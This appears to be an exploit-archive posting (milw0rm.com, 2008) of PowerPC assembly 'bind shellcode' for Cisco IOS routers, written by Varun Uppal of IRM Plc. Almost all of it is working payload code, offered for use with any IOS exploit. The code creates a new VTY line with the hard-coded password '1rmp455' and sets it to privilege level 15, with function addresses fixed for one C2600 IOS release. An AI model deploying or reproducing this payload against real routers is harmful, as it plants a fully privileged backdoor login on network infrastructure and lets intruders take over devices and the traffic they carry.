# ----------------------------------------------------------------------------------------
#
# Cisco IOS Bind shellcode v1.0
# (c) 2007 IRM Plc
# By Varun Uppal
#
# ----------------------------------------------------------------------------------------
#
# The code creates a new VTY, allocates a password then sets the privilege level to 15
#
# This shellcode can be used as the payload for any IOS exploit on a PowerPC-based device.
# Once assembled, the payload is only 116 bytes in length
#
# The following four hard-coded addresses must be located for the target IOS version.
# Version 1.1 of the shellcode will auto-locate these values and make the code
# IOS-version-independent
#
# The hard-coded addresses used here are for:
#
# IOS (tm) C2600 Software (C2600-IK9S-M), Version 12.3(22), RELEASE SOFTWARE (fc2)
#
# ----------------------------------------------------------------------------------------
.equ makenewvty, 0x803d0d08
.equ malloc, 0x804785cc
.equ setpwonline, 0x803b9e90
.equ linesstruct, 0x82f9e334
# ----------------------------------------------------------------------------------------

.equ priv, 0xf1000000		#value used to set the privilege level

main:	li 3,71			#new vty line = 71
	lis 9,makenewvty@ha
	la 9,makenewvty@l(9)
	mtctr 9
	bctrl			#makenewvty()

	li 3,0x1e5c
	lis 9,malloc@ha
	la 9,malloc@l(9)
	mtctr 9
	bctrl			#malloc() memory for structure

	li 4,70
	stw 4,0xa68(3)
	li 5,72
	stw 5,0xa6c(3)
	li 4,0x00
	bl setp			#pointer to the password into LR

.string "1rmp455"		#the password for the line

setp:	mflr 5
	lis 9,setpwonline@ha
      	la 9,setpwonline@l(9)
      	mtctr 9
      	bctrl			#setpwonline()

	lis 8,linesstruct@ha
      	la 8,linesstruct@l(8)
	lwz 9,0(8)
	lis 7,priv@ha
     	la 7,priv@l(7)
	stw 7,0xde4(9)		#set privilege level to 15

# milw0rm.com [2008-08-13]